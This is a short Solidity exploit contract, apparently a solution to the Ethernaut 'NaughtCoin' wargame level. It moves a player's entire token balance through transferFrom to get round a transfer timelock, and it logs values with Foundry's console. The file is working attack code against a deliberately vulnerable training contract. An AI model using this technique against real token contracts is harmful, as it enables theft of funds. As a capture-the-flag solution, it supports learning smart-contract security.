// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";
import {Script, console} from "forge-std/Script.sol";


contract NaughCoin_exp{

    function attack(address nc, address player) public {
        
        NaughtCoin coin = NaughtCoin(nc);
        // nc.transferFrom(from, to, value);
        // uint256 value = address(nc).balance;
        

        uint256 value = coin.balanceOf(player);
        console.log("[+]msg.sender:", msg.sender);
        console.log("[+]msg.sender:", player);
        
        console.log("[+]", value);
        coin.transferFrom(player, address(this), value);
    }

    function withdraw() public  {
        payable(msg.sender).transfer(address(this).balance);
    }

}